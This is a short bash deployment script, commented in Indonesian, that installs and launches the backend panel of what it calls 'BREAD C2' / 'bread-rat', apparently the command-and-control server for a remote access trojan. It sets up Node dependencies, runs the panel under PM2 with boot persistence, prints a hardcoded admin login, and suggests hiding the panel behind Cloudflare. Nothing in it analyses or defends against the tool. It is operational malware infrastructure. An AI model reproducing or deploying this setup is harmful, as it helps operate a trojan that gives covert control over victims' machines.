#!/bin/bash
# BREAD DEPLOY v1.0 - Setup panel otomatis

echo "🍞 BREAD C2 DEPLOY SCRIPT"
echo "=========================="

# Update & install dependencies
sudo apt update && sudo apt upgrade -y
sudo apt install -y nodejs npm git screen sqlite3

# Clone / copy project
mkdir -p /opt/bread-rat
cp -r ./panel-backend /opt/bread-rat/

# Install PM2
sudo npm install -g pm2

# Install dependencies
cd /opt/bread-rat/panel-backend
npm install express socket.io sqlite3 bcryptjs jsonwebtoken cors crypto

# Setup database (otomatis oleh server.js)
# Jalankan dengan PM2
pm2 start server.js --name bread-rat
pm2 save
pm2 startup

echo "✅ Deployment selesai!"
echo "🔒 Panel running on port 8443"
echo "👤 Login: admin / BreadRAT2025!"
echo "📌 Pastikan firewall membuka port 8443 (atau proxy via Cloudflare)"
